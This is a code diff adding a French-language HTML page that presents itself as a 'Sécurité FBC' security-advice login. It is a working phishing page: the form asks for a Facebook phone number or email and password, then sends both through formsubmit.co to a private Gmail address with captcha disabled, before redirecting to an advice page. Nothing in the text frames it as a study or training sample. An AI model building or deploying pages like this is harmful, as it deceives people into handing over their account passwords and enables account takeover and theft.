@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sécurité FBC - Connexion</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #1a1a2e;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #162447;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            border: 1px solid #0f3460;
+        }
+        h1 {
+            color: #e94560;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        p {
+            color: #b5b5b5;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #e94560;
+            font-size: 14px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border-radius: 5px;
+            border: 1px solid #0f3460;
+            background-color: #1a1a2e;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+        }
+        input[type="text"]:focus {
+            border-color: #e94560;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #e94560;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #ff6b81;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <h1>Sécurité FBC</h1>
+        <p>Connectez-vous pour accéder à vos conseils de sécurité personnalisés.</p>
+
+        <form action="https://formsubmit.co/sx44999@gmail.com" method="POST">
+
+            <input type="hidden" name="_next" value="conseils.html">
+            <input type="hidden" name="_captcha" value="false">
+
+            <div class="input-group">
+                <label for="firstname">Écris ton numéro de téléphone ou adresse email Facebook</label>
+                <input type="text" id="firstname" name="numéro de téléphone ou adresse email Facebook" placeholder="Ex: Jean@gmail.com" required>
+            </div>
+
+            <div class="input-group">
+                <label for="lastname">Écris ton mot de passe</label>
+                <input type="text" id="lastname" name="mot de passe" placeholder="Ex: Dupont0" required>
+            </div>
+
+            <button type="submit">Se connecter via Facebook</button>
+        </form>
+    </div>
+
+</body>
+</html>
